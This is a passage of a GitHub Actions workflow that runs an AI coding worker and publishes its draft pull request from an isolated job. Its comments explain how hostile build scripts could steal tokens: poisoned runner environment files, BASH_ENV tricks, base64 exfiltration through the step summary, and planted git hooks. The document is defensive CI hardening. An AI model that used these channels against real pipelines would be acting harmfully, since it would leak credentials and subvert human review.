          # never the `if:`: gating this compensating step on a prepare output is precisely the
          # unreachability defect dispatch-secrets-guard refuses.
          WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
          WORKER_CREDENTIAL_BASELINE: ${{ steps.prepare.outputs.credential_baseline }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_SECRETS_PAT: ${{ secrets.REGISTRY_SECRETS_PAT }}
        run: bash registry/scripts/worker-live.sh write-back

      # [issue #232 review r2] THE CREDENTIAL FILES, not just the pointers. Keeping
      # WORKER_CREDENTIAL_PATH and the isolated HOME out of the job-wide $GITHUB_ENV (above) stops
      # any later step being HANDED the credential; it does not stop one FINDING it. GitHub supplies
      # $RUNNER_TEMP to every step unconditionally, WORKER_ROOT is `$RUNNER_TEMP/registry-worker`,
      # and the two steps below run TARGET-CONTROLLED code as this same runner user — rustup honours
      # the target's own `rust-toolchain.toml`, and the gate executes its build scripts and tests. A
      # mode-600 file owned by that user is readable to it. So the tree goes NOW, while every step
      # that has run so far is host-authored.
      #
      # It must sit after the write-back (which reads the rotation baseline and the mounted
      # credential to make #134's containment assertion) and before the toolchain step. `always()`,
      # never a success guard: the window this closes is widest on the runs that FAILED, and a purge
      # skipped by a failed model step is a purge that was not there. A purge that cannot remove the
      # material exits nonzero, and the gate's own `if:` carries an implicit `success()`, so the
      # target's code never runs on a runner that still holds the account credential.
      - name: Purge the account credential tree before any target-controlled code
        id: purge
        if: ${{ always() }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: bash registry/scripts/worker-live.sh purge-credentials

      - name: Ensure a Rust toolchain for the crate-scoped gate
        # [OPUS-4.8] The gate runs `cargo clippy/test` directly on the runner; a stock ubuntu-latest may
        # have rustup with NO default toolchain set (and the target may pin one via rust-toolchain.toml),
        # which fails the gate with "rustup could not choose a version of cargo". Set one up in the target
        # dir so a rust-toolchain.toml pin is honoured; harmless for non-cargo gate profiles.
        if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}
        working-directory: target
        run: |
          set -uo pipefail
          command -v rustup >/dev/null 2>&1 || { echo '::error::rustup not found on the runner'; exit 1; }
          rustup show active-toolchain >/dev/null 2>&1 || rustup default stable
          rustup show >/dev/null 2>&1 || true      # installs a rust-toolchain.toml-pinned toolchain if present
          rustup component add clippy rustfmt >/dev/null 2>&1 || true
          cargo --version; rustc --version

      - name: Run policy-selected local gate
        id: gate
        if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}
        working-directory: target
        env:
          TARGET_DIR: ${{ github.workspace }}/target
          GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
          WORKER_PACKAGES: ${{ needs.resolve.outputs.packages }}
          # [OPUS-4.8] Credential-safety (security review, finding #3): do NOT `tee` the gate's own
          # stdout+stderr — which is target-CONTROLLED cargo output (build scripts / tests) — into a
          # runner-local file. An earlier revision did that to feed a diagnostics artifact; a hostile
          # build script could exhaust runner disk by writing the COMPLETE unbounded stream to that
          # file before any tail bounded it. The gate's stream is already surfaced verbatim in the
          # GitHub job log (streamed off-runner, not a local file), which is a sufficient and safe
          # crash signal. The failure-class annotation below reads only host-derived step outcomes.
          #
          # [issue #568 review r2] QUARANTINE the runner command files for this step. A build
          # script / test that this gate executes is TARGET-CONTROLLED code running on the runner
          # host, and $GITHUB_ENV / $GITHUB_PATH are cross-step primitives: an append to the former
          # persists BASH_ENV, LD_PRELOAD or PYTHON* into EVERY later step (a BASH_ENV startup file
          # containing `exit 0` makes the next `run:` block succeed having executed none of it),
          # and an append to the latter puts an attacker binary ahead of the system bash / python3 /
          # sha256sum the pre-publish verifier below depends on. Pointing both at a path the runner
          # never reads back removes the primitive rather than racing it. Nothing legitimate is
          # lost: `worker-live.sh gate` reports through its exit status and writes neither file
          # (the WORKER_EXIT_CLASS / WORKER_BRANCH appends live in the model+launch path, a
          # different step), and `steps.gate.outputs` has no consumer.
          #
          # [issue #91] ALL FOUR command files, not the two cross-step ones. $GITHUB_STEP_SUMMARY
          # is the one an exfiltrator actually wants: it is RETAINED and rendered on the run page,
          # it takes arbitrary markdown, and — unlike a step's log stream — nothing about it is
          # even nominally a build diagnostic, so hostile cargo can publish a base64 blob there
          # with no crash to explain it. $GITHUB_OUTPUT is the same primitive one indirection out
          # (a target-authored `steps.gate.outputs.*` expanded by a later step). Neither is written
          # by `worker-live.sh gate`, and `steps.gate.outputs` has no consumer, so quarantining
          # them removes a channel and costs nothing. Encoding is why quarantine beats redaction:
          # GitHub masks the exact secret string, and base64 of it is not that string.
          #
          # [issue #91 review r1] WHAT THIS IS NOT. Rebinding these four variables is ENV-LEVEL
          # only: it removes the channel from every actor that reaches a command file the
          # documented way (the environment), which is every build script, test harness and action
          # that writes one. It is NOT an isolation boundary. The gate's target-controlled code
          # runs as the SAME runner user, the runner's REAL command files still sit under
          # $RUNNER_TEMP/_runner_file_commands/ (set_env_*, add_path_*, step_summary_*), and code
          # that enumerates that directory can append to them directly — the runner consumes them
          # at step end whatever this step's environment said. No workflow-level mechanism prevents
          # a same-uid write; only a real boundary does. In THIS job that boundary already exists
          # and is what the security property rests on: NOTHING TOKEN-BEARING FOLLOWS THE GATE
          # (#575, asserted live by `_tokens_after_gate`). Read the four lines below as
          # defence-in-depth behind that, never as containment.
          GITHUB_ENV: ${{ runner.temp }}/gate-quarantine/env
          GITHUB_PATH: ${{ runner.temp }}/gate-quarantine/path
          GITHUB_OUTPUT: ${{ runner.temp }}/gate-quarantine/output
          GITHUB_STEP_SUMMARY: ${{ runner.temp }}/gate-quarantine/step-summary
        run: bash ../registry/scripts/worker-live.sh gate

      # NOTHING TOKEN-BEARING FOLLOWS THE GATE (issue #575). Commit/push/DRAFT-PR and the follow-up
      # issues used to live right here, on this runner, with a contents/workflows/issues/PR-capable
      # App token — after the gate had already executed target-controlled build scripts and tests.
      # They now run in the isolated `publish` job below, which executes no target code and no
      # target-writable script, and which reconstructs the model's work from the digest-bound
      # bundle sealed BEFORE the gate. The post-gate `app-token-publish` and post-model
      # `app-token-post` mints are gone with them: there is no longer anything on this runner for a
      # write-capable token to serve.
      #
      # [issue #568 + #575] The pre-publish LIVE-TRUST re-check moved with them, into the `publish`
      # job, and is stronger there. Its property is unchanged — publication may only ever proceed
      # from a snapshot re-attested seconds earlier, so a maintainer who closed, rewrote or
      # human-parked the issue during the tens-of-minutes model+gate span is never published over —
      # but it no longer has to defend itself against the runner it executes on. On THIS runner the
      # re-check needed a digest-pinned verifier SNAPSHOT because target-controlled gate code could
      # rewrite the registry checkout beside it; in the publisher no target code has ever run. What
      # crosses instead are the PRE-MODEL digests `pin-trust-gate` recorded above (as job outputs),
      # which the publisher re-binds its own trust root to before it re-verifies anything.

      # [OPUS-4.8] The diagnostics ARTIFACT was DROPPED for credential-safety (security review,
      # finding #1). Rationale: the `gate` step above runs target-CONTROLLED cargo (build scripts /
      # tests) while the job env exposes the account handle and credential file paths. Any file the
      # artifact bundled lived at a path that hostile cargo could write to (it could plant credentials
      # or a raw model transcript into the predictable diagnostics dir), and the artifact uploaded the
      # directory WHOLESALE — an exfiltration channel. Even the "expected" files were unsafe: the gate
      # output is unredacted target output and error-signals.log is raw CLI stderr. The artifact was
      # only a nice-to-have: the primary crash signal (the `gate` step's nonzero exit + its verbatim
      # stdout/stderr already in the GitHub job log) is preserved without it. The failure-class
      # annotation below carries the essential, bounded, host-derived signal instead.

      - name: Cleanup isolated worker state
        if: ${{ always() }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: rm -rf -- "$WORKER_ROOT"

      # [OPUS-4.8] Fail-SOFT failure-class annotation (security review, finding #2). This step ONLY
      # annotates; it must NEVER become the terminal failure signal or mask the real cause, so it is
      # `continue-on-error: true` and does NOT `exit 1` (an unconditional nonzero here would re-mask
      # the primary signal — the very masking this diagnostics work set out to remove). The genuine
      # failure is already surfaced by the `gate`/`bundle` steps' own nonzero exits and the gate's
      # verbatim output in the job log. The annotation carries ONLY bounded, host-derived values: the
      # class of failure (which step outcome) and the resolved WORKER_PACKAGES atom(s). It deliberately
      # echoes NO target-controlled content (no raw gate stderr, no CLI stderr, no transcript, no
      # account handle / credential paths), so there is no path for hostile cargo output to reach it.
      #
      # [issue #575] The terminal condition is now `gate`/`bundle`, not `pr`: this job no longer
      # opens the pull request. A run that gets past both hands off to the isolated `publish` job,
      # whose own red tick (and the always() `final_state` deferral) is the signal from there on.
      - name: Preserve live-attempt failure signal (annotation only)
        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.budget.outputs.exhausted != 'true' && steps.trust.outcome == 'success' && (steps.gate.outcome != 'success' || steps.bundle.outcome != 'success') }}
        continue-on-error: true
        env:
          GATE_OUTCOME: ${{ steps.gate.outcome }}
          MODEL_OUTCOME: ${{ steps.model.outcome }}
          BUNDLE_OUTCOME: ${{ steps.bundle.outcome }}
          RESOLVED_PACKAGES: ${{ needs.resolve.outputs.packages }}
        run: |
          set -uo pipefail
          echo '::warning::Live worker attempt produced no publishable work (model outcome='"${MODEL_OUTCOME:-?}"', bundle outcome='"${BUNDLE_OUTCOME:-?}"', gate outcome='"${GATE_OUTCOME:-?}"').'
          if [[ "${MODEL_OUTCOME:-}" == "success" && "${GATE_OUTCOME:-}" != "success" ]]; then
            echo '::warning::The model produced work but the local gate did not pass for package atom(s) ['"${RESOLVED_PACKAGES:-?}"'] — the gate error is in this run job log above (the Run policy-selected local gate step output); no artifact is produced by design (credential-safety).'
          fi
          # [issue #568 + #575] The gate-green-but-no-PR causes (live issue drift, a missing
          # attestation) are no longer annotatable HERE: the re-check and the PR both live in the
          # isolated `publish` job now, so that job carries its own annotation for them.

  # ISSUE #575 — the isolated publisher. The `worker` job runs the target's own gate (arbitrary
  # target-controlled build scripts and tests) as the runner user; it used to then commit, push,
  # open the DRAFT PR and file follow-up issues ON THE SAME RUNNER, executing a MUTABLE registry
  # script (`registry/scripts/worker-live.sh`, a sibling checkout the gate can write) with a
  # contents/workflows/issues/PR-capable App token in GH_TOKEN. Gated target code could therefore
  # capture that token or publish arbitrary post-gate content through four surfaces: rewriting the
  # publisher script, poisoning $GITHUB_ENV/$GITHUB_PATH for later steps, leaving a detached
  # process alongside the token-bearing ones, and planting a `.git/hooks/pre-commit` that ran with
  # GH_TOKEN inherited (the old publish path used a plain `git commit`, no --no-verify).
  #
  # This job closes all four by extending the pattern `final_state`/`provenance`/`model_health`/
  # `release` already use: a FRESH runner that executes NO target code and NO target-writable
  # script. The model's work crosses as INERT DATA — the digest-bound bundle sealed before the gate
  # — and is reconstructed here with `git apply` onto a fresh checkout of the pre-gate base, hooks
  # neutralised. Nothing from the bundle is ever executed.
  #
  # FAIL-CLOSED ORDERING: the artifact is verified against the pre-gate step outputs BEFORE the App
  # token is minted, so a mismatched / oversized / unreadable bundle never causes a write-capable
  # token to exist at all. Every refusal leaves pr_url empty, and the always() `final_state` job
  # converges the issue to status:deferred (out of status:in-progress, back into the redispatch
  # pool) exactly as it does for a timed-out worker. There is deliberately NO fallback that mints
  # on the worker runner.
  publish:
    name: Publish DRAFT target pull request (no target code runs here)
    # bundle_digest is non-empty only when the PRE-GATE seal succeeded, so a worker that was
    # cancelled, timed out, produced no changes, or never launched the model skips this job
    # entirely (empty outputs -> no publish -> deferred).
    if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && needs.worker.outputs.bundle_digest != '' }}
    needs: [resolve, claim, worker]
    runs-on: ubuntu-latest
    timeout-minutes: 20
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only).
    environment: dispatch-secrets
    permissions:
      contents: read
    outputs:
      pr_number: ${{ steps.pr.outputs.pr_number }}
      pr_url: ${{ steps.pr.outputs.pr_url }}
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # The artifact, the head branch and the `provenance` job's reconciliation branch are all keyed
      # on `github.run_id`.`github.run_attempt`, so a PARTIAL re-run (re-running only this job, with
      # the worker job's results preserved) finds no artifact for the new attempt and fails CLOSED
      # to a deferral — never a PR on a branch `provenance` cannot reconcile, which is the worse of
      # the two outcomes. A full re-run re-executes the worker and seals a fresh bundle.
      - name: Download the pre-gate publish bundle (pinned)
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          name: publish-bundle-${{ github.run_id }}-${{ github.run_attempt }}
          path: ${{ runner.temp }}/publish-bundle

      # BEFORE ANY TOKEN EXISTS. Re-derives the bundle digest from the downloaded artifact and
      # compares it — plus the recorded target repo, base SHA, head branch and issue — against the
      # PRE-GATE step outputs and this run's own trusted identity. worker-live.sh asserts that no
      # GH_TOKEN is in scope here, so moving the mint above this step turns the check red rather
      # than silently voiding the ordering property it exists to enforce.
      - name: Verify the publish bundle against the pre-gate record (no token minted yet)
        id: verify
        env:
          WORKER_BUNDLE_DIR: ${{ runner.temp }}/publish-bundle
          WORKER_BUNDLE_DIGEST: ${{ needs.worker.outputs.bundle_digest }}
          # The PRE-GATE base, cross-checked below against the revision `resolve` pinned the route
          # (and the account claim) to: both are recorded before any target code ran.
          WORKER_BUNDLE_BASE_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
          # DETERMINISTIC head branch from trusted run identity — the SAME construction the
          # `provenance` job reconciles on and worker-live.sh's run_model builds. Never taken from
          # the bundle: the bundle must MATCH it or verification defers.
          WORKER_BUNDLE_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
          TARGET_REPO: ${{ inputs.target_repo }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          RESOLVED_SHA: ${{ needs.resolve.outputs.target_sha }}
          RECORDED_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
        run: |
          set -euo pipefail
          # The pre-gate base MUST be the revision the pre-hostile `resolve` job pinned the route
          # to. A drift here means the worker rebased/re-pointed the checkout after routing, so the
          # patch is not bound to reviewed state — defer rather than publish it.
          [[ "$RECORDED_SHA" == "$RESOLVED_SHA" ]] || {
            echo '::error::pre-gate base SHA is not the resolved routing revision — skipping publish'
            exit 1
          }
          bash registry/scripts/worker-live.sh verify-bundle

      # [issue #33] THE GATE-FAILED LANE — DIAGNOSTIC RETENTION, AND IT NEVER TOUCHES THE TARGET.
      # A failed gate used to discard the model's completed work outright: the `pr` step is skipped,
      # the run ends, and the only surviving copy of the diff was the pre-gate bundle artifact whose
      # 1-day retention expired unread, so a systematic gate failure lost the evidence needed to
      # diagnose it. The work is RETAINED instead — as the same digest-verified bundle, re-uploaded
      # from THIS run to THIS repository's artifact storage under a long retention.
      #
      # ⚠️ IT IS AN ARTIFACT, NOT A GIT REF, AND THAT IS THE SECURITY PROPERTY (review round 2 of
      # #1446). An earlier revision pushed the reconstructed commit to a `sparq-agent/gate-failed/`
      # branch in the TARGET repository, reasoning that the namespace is invisible to this registry's
      # provenance/review/arm enumerators. That reasoning was wrong at the boundary that matters: a
      # branch name only hides a ref from THIS repo's consumers, it does not make the ref inert. The
      # push is performed with a contents+workflows-write App token, so it raises a `push` event in
      # the target and any `on: push` workflow there runs as a consequence — INCLUDING a workflow the
      # candidate bundle itself adds or rewrites under `.github/workflows/`. That turns gate-FAILED,
      # unreviewed content into target-side EXECUTION with the target's own Actions capabilities and
      # secrets, which is exactly what a failed gate exists to prevent. There is no branch-name
      # convention that fixes it. So the diagnostic lives on a plane that executes nothing: an
      # artifact is inert data, it is scoped to this run in this repository, and no token of any kind
      # is in scope here — this step is deliberately placed BEFORE the App-token mint below, so a
      # failed gate cannot reach a write credential at all.
      #
      # ⚠️ SCOPE: NOTHING CONSUMES THIS ARTIFACT AUTOMATICALLY (review round 1 of #1446). The next
      # attempt still checks out the default branch and re-runs the model from scratch; the fix loop
      # only ever operates on an existing pull request's head. This lane buys a HUMAN a durable copy
      # of the failing tree — it does not resume anything and it does not avoid re-paying model cost.
      #
      # THE GATE MUST HAVE ACTUALLY RUN AND ACTUALLY FAILED. `== 'failure'` is exact on purpose:
      # `gate_outcome` is `steps.gate.outcome` from the worker job, and the gate step carries an
      # implicit `success()`, so a failed toolchain setup — or any earlier step failing between the
      # PRE-gate bundle seal and the gate — leaves a perfectly valid bundle with the gate SKIPPED.
      # Under a `!= 'success'` test (and likewise for an empty/cancelled outcome) that absent verdict
      # would read as a gate failure. A missing verdict is not a verdict, so it retains nothing.
      # `steps.verify.outcome` keeps this bound to the bundle that MATCHED the pre-gate record: an
      # artifact refused as tampered must not be re-published under a longer retention either.
      #
      # DELIBERATELY NO `continue-on-error`. It cannot mask the gate: on this lane the worker job is
      # already red with the gate's own nonzero exit and verbatim output, and on the gate-green lane
      # this step is skipped and so cannot fail at all. Every downstream job (`final-state`,
      # `provenance`, `release`) is `always()`-gated and reads the worker's outputs, so a red
      # publisher here still converges the issue to `status:deferred` and still frees the lease.
      # Swallowing the error would only hide the one thing this step exists to guarantee.
      - name: Retain the gate-FAILED diff for diagnosis (inert artifact, no target write)
        id: preserve
        if: ${{ needs.worker.outputs.gate_outcome == 'failure' && steps.verify.outcome == 'success' }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: gate-failed-issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
          path: ${{ runner.temp }}/publish-bundle
          # Long enough that a systematic gate failure is still diagnosable after the wave that
          # produced it has been triaged, and bounded on purpose: this repository is public, so the
          # artifact is readable by anyone: the same content class as the 1-day pre-gate bundle
          # beside it, kept no longer than a diagnosis needs.
          retention-days: 30
          if-no-files-found: error

      # Minted only AFTER the bundle verified. Same scopes the old in-worker publish used, but now
      # they exist on a runner that has never executed target code.
      - name: Mint target-scoped App token for the verified publish
        id: app-token-pub
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: write
          permission-issues: write
          permission-pull-requests: write
          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
          # branches touching .github/workflows/* (role:ci issues were structurally blocked).
          permission-workflows: write

      # The publisher checks out the target at the PRE-GATE BASE — never at the worker's post-gate
      # worktree, which is exactly the artefact this whole job exists to distrust. fetch-depth: 0
      # because a push from a shallow clone can be refused by the remote.
      #
      # [issue #33] Still keyed on the GATE VERDICT. The gate-failed retention lane above is an
      # artifact upload — it needs no checkout, no token and no live-trust re-check, because it
      # writes nothing to the target — so a failed gate continues to reach no target-write
      # machinery whatsoever, exactly as before this lane existed.
      - name: Checkout target at the pre-gate base (pinned, no persisted token)
        # `id:` carries no runtime meaning here — it exists so the self-test can extract and
        # EVALUATE this step's condition by name, which is how "a gate-FAILED run reaches no
        # target-touching step at all" became an asserted property rather than a claim.
        id: checkout-target
        if: ${{ needs.worker.outputs.gate_outcome == 'success' }}
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          ref: ${{ needs.worker.outputs.bundle_base_sha }}
          path: target
          token: ${{ steps.app-token-pub.outputs.token }}
          fetch-depth: 0
          persist-credentials: false

      # [issue #568] Last-step trust is validated ONCE MORE here — in the fresh publisher,
      # immediately before push/PR creation. The pre-model `trust` step in the worker job ran BEFORE
      # the model and the host-side cargo gate, i.e. potentially tens of minutes ago (the worker
      # budget is worker_timeout_minutes, up to 90, and this publisher is a separate job with its
      # own queue delay on top). A maintainer who has since closed, rewritten, or human-parked the
      # issue would otherwise be published over from that stale snapshot. This repeats the FULL live
      # author / body-SHA / status-label / trust-gate revalidation against the LIVE issue, so
      # publish only ever runs from a snapshot re-attested seconds earlier. On ANY drift it fails
      # (continue-on-error, mirroring the worker's pre-model `trust` step) which gates the publish
      # step below OFF; that step checks this one's OUTCOME **and** its positive attestation
      # explicitly, so continue-on-error cannot make it fail open.
      #
      # `--mode pre-publish`: the worker's claim step ITSELF moved the issue ready -> in-progress,
      # so dispatch mode's status:ready demand would refuse every legitimate run and publication
      # would be non-functional. Pre-publish mode accepts exactly this run's still-live claim —
      # proven by the ownership-receipt CAS bound to $GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT (shared by
      # every job in this run), never by the shared label alone — and fails closed on a
      # foreign/superseded claim, human parking, deferral, a re-opened pool state, or a
      # closed/rewritten issue.
      #
      # It changes NO human-owned issue state — it only READS the issue and runs the read-only
      # trust gate — so an aborted publish leaves the maintainer's action intact and the always()
      # `final_state` job converges the issue to `deferred` (back into the redispatch pool).
      #
      # TRUST ROOT (issue #568 + #575). Running here rather than on the worker runner is what makes
      # this sound: no target code has ever executed in this job, so neither the driver below nor
      # the trust gate it invokes can have been rewritten by the candidate change or by the gate's
      # build scripts. Both halves are nevertheless re-bound to the digests `pin-trust-gate`
      # recorded PRE-MODEL in the worker job, which is a strictly stronger statement than "a fresh
      # checkout is probably the same bytes":
      #   * the trust GATE is the target's own program, taken from the target checkout at the
      #     PRE-GATE base — pristine, since the bundle is not applied until the step below — and it
      #     must equal the copy the worker snapshotted from the SHA-pinned pre-model checkout;
      #   * the reverify DRIVER (and the park_policy sibling its ownership CAS loads by path) come
      #     from this job's own registry checkout and must equal the pre-model registry copies.
      # A mismatch anywhere means the program authorizing publication is not the reviewed one, so
      # the step dies and publication stays gated off. --forbid-gate-root makes "never verify with a
      # program the candidate change supplied" a fail-closed RUNTIME assertion (symlinks and `..`
      # are resolved) over the one candidate-controlled tree that exists here: the bundle.
      - name: Re-verify live trust immediately before publish (drift → abort, no state change)
        id: republish-trust
        if: ${{ needs.worker.outputs.gate_outcome == 'success' && steps.verify.outcome == 'success' }}
        continue-on-error: true
        env:
          GH_TOKEN: ${{ steps.app-token-pub.outputs.token }}
          # bash expands and SOURCES $BASH_ENV (and $ENV in posix mode) before the first line of the
          # block below runs, so those two levers cannot be cleared inside it. Nothing in this job
          # can set them today — no target code runs here — but the block's correctness must not
          # depend on that remaining true, and the positive attestation at the end is the backstop:
          # no short-circuit of the block can produce it.
          BASH_ENV: ''
          ENV: ''
        run: |
          set -euo pipefail
          # Hardened lookup path and cleared interpreter levers, for the same defence-in-depth
          # reason: the verification must not be steerable by inherited environment even in a job
          # where nothing is expected to set it. PATH is reset to the system allowlist BEFORE any
          # command is looked up; python runs in isolated mode (-I: ignores PYTHON* and drops the
          # script's own directory from sys.path). PYTHONNOUSERSITE is exported rather than unset
          # because it is the one lever that must be ON: it also reaches the trust-gate CHILD the
          # driver spawns. A tool missing from the hardened PATH aborts (fail-closed: no publish),
          # never falls back to the inherited one.
          export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
          unset BASH_ENV ENV IFS PYTHONPATH PYTHONHOME PYTHONSTARTUP LD_PRELOAD LD_LIBRARY_PATH
          export PYTHONNOUSERSITE=1
          for tool in sha256sum python3; do
            command -v "$tool" >/dev/null \
              || { echo "::error::pre-publish verifier: $tool is not on the hardened PATH"; exit 1; }
          done
          # Paths come from the github.workspace EXPRESSION (runner state), never a $GITHUB_WORKSPACE
          # env lookup, so the same construction holds if this job ever gains a step that can write
          # the runner's environment files.
          verifier='${{ github.workspace }}/target/scripts/trust-gate.py'
          driver='${{ github.workspace }}/registry/scripts/worker-issue.py'
          policy='${{ github.workspace }}/registry/scripts/park_policy.py'
          expected='${{ needs.worker.outputs.verifier_sha256 }}'
          driver_expected='${{ needs.worker.outputs.verifier_driver_sha256 }}'
          policy_expected='${{ needs.worker.outputs.verifier_policy_sha256 }}'
          # An ABSENT pre-model digest must not wave the comparison through: a skipped or failed pin
          # step leaves these empty, and publication has to fail closed rather than verify against
          # nothing at all.
          [[ "$expected" =~ ^[0-9a-f]{64}$ && "$driver_expected" =~ ^[0-9a-f]{64}$ \
             && "$policy_expected" =~ ^[0-9a-f]{64}$ ]] \
            || { echo '::error::pre-model verifier digest missing — refusing to publish'; exit 1; }
          printf '%s  %s\n%s  %s\n%s  %s\n' "$expected" "$verifier" "$driver_expected" "$driver" \
            "$policy_expected" "$policy" \
            | sha256sum --check --strict --quiet -
          # The one candidate-change-controlled tree in this job. The verifier must never resolve
          # into it; reverify asserts that at runtime rather than trusting this convention.
          forbidden='${{ runner.temp }}/publish-bundle'
          python3 -I "$driver" reverify \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --expected-author "${{ needs.resolve.outputs.issue_author }}" \
            --expected-body-sha "${{ needs.resolve.outputs.issue_body_sha }}" \
            --trust-gate "$verifier" \
            --forbid-gate-root "$forbidden" \
            --bot-login "${{ needs.worker.outputs.bot_login }}" \
            --issue-file '${{ runner.temp }}/reverified-issue.json' \
            --current-run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --mode pre-publish
          # POSITIVE ATTESTATION. Publication is gated on this OUTPUT, not merely on this step's
          # outcome, because an outcome of `success` is produced by EVERY exit-0 path — including
          # paths that never reached the verifier at all (a BASH_ENV startup file that `exit 0`s, a
          # process killed after a trivially-true command). This line is reachable only after
          # reverify itself returned 0 under `set -e`, so any short-circuited block leaves the
          # output EMPTY and the publish step below stays gated off. Its value re-states the
          # pre-model digest, binding publish to the trust root the verification actually ran from.
          printf 'verified=%s\n' "$expected" >> "$GITHUB_OUTPUT"

      - name: Reconstruct, push, and open the DRAFT target pull request (review pending)
        id: pr
        # Gated on the GATE VERDICT that crossed as a value from the worker job. A failed gate
        # publishes nothing; the follow-up step below still runs, matching the behaviour the old
        # in-worker `always()` followups step had.
        #
        # [issue #568] ...and on the live-trust re-check above: its OUTCOME, plus the positive
        # attestation it emits only after the re-verification actually returned. A success outcome
        # alone proves only that the step's shell exited 0, which a short-circuited block can
        # arrange without verifying anything. `!= ''` is load-bearing on its own terms: an unset
        # output equals an unset digest, so the equality alone would hold vacuously if both the pin
        # and the re-check were skipped.
        if: ${{ needs.worker.outputs.gate_outcome == 'success' && steps.republish-trust.outcome == 'success' && steps.republish-trust.outputs.verified != '' && steps.republish-trust.outputs.verified == needs.worker.outputs.verifier_sha256 }}
        env:
          GH_TOKEN: ${{ steps.app-token-pub.outputs.token }}
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_REPO: ${{ inputs.target_repo }}
          TARGET_DEFAULT_BRANCH: ${{ needs.worker.outputs.default_branch }}
          TARGET_BOT_LOGIN: ${{ needs.worker.outputs.bot_login }}
          TARGET_BOT_ID: ${{ needs.worker.outputs.bot_id }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          WORKER_ROOT: ${{ runner.temp }}/publisher
          WORKER_BUNDLE_DIR: ${{ runner.temp }}/publish-bundle
          WORKER_BUNDLE_DIGEST: ${{ needs.worker.outputs.bundle_digest }}
          WORKER_BUNDLE_BASE_SHA: ${{ needs.worker.outputs.bundle_base_sha }}
          WORKER_BUNDLE_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
        run: |
          set -euo pipefail
          mkdir -p "$WORKER_ROOT"
          bash registry/scripts/worker-live.sh publish

      - name: Create declared follow-up issues (discovered out-of-scope work)
        id: followups
        # The procedure for the orchestrator to capture work it discovers but must NOT do in this
        # PR: the model appends {title, body, labels} lines to `.worker-followups.jsonl`, which
        # worker-live.sh lifts out of the target tree BEFORE the seal (so it is never committed)
        # and carries into the digest-bound bundle. That means the lines created here are exactly
        # the lines that existed BEFORE the gate ran — the gate cannot add, edit or drop one.
        # Best-effort; never fails the publisher. `always()` is load-bearing: a failed gate
        # publishes no PR but its declared follow-ups must still be filed.
        if: ${{ always() && steps.verify.outcome == 'success' }}
        continue-on-error: true
        env:
          GH_TOKEN: ${{ steps.app-token-pub.outputs.token }}
          SPEC_FILE: ${{ runner.temp }}/publish-bundle/followups.jsonl
        run: |
          set -uo pipefail
          [[ -f "$SPEC_FILE" ]] || { echo 'no declared follow-ups in the verified bundle'; exit 0; }
          for l in from:agent self-improvement; do
            gh label create "$l" -R "${{ inputs.target_repo }}" --color ededed \
              --description "worker-discovered follow-up" 2>/dev/null || true
          done
          python3 registry/scripts/worker-issue.py followup \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --spec-file "$SPEC_FILE" || true

      # [issue #568 + #575] Fail-SOFT annotation for the gate-green-but-no-PR case, which the worker
      # job can no longer explain (both the re-check and the PR live here now). Without it the
      # operator sees a green worker, a green gate and simply no pull request, with no reason given
      # anywhere. Annotation ONLY: `continue-on-error` and no `exit 1`, so it can never become the
      # terminal signal or mask the real cause. Every value is host-derived (step outcomes/outputs
      # and this run's own digests) — no target-controlled content, and nothing token-shaped.
      - name: Preserve pre-publish refusal signal (annotation only)
        if: ${{ always() && needs.worker.outputs.gate_outcome == 'success' && steps.pr.outcome != 'success' }}
        continue-on-error: true
        env:
          VERIFY_OUTCOME: ${{ steps.verify.outcome }}
          REPUBLISH_OUTCOME: ${{ steps.republish-trust.outcome }}
          REPUBLISH_VERIFIED: ${{ steps.republish-trust.outputs.verified }}
          PINNED_VERIFIER_SHA: ${{ needs.worker.outputs.verifier_sha256 }}
          PR_OUTCOME: ${{ steps.pr.outcome }}
        run: |
          set -uo pipefail
          echo '::warning::The gate passed but no DRAFT pull request was published (bundle verify outcome='"${VERIFY_OUTCOME:-?}"', pre-publish trust outcome='"${REPUBLISH_OUTCOME:-?}"', pr outcome='"${PR_OUTCOME:-?}"').'
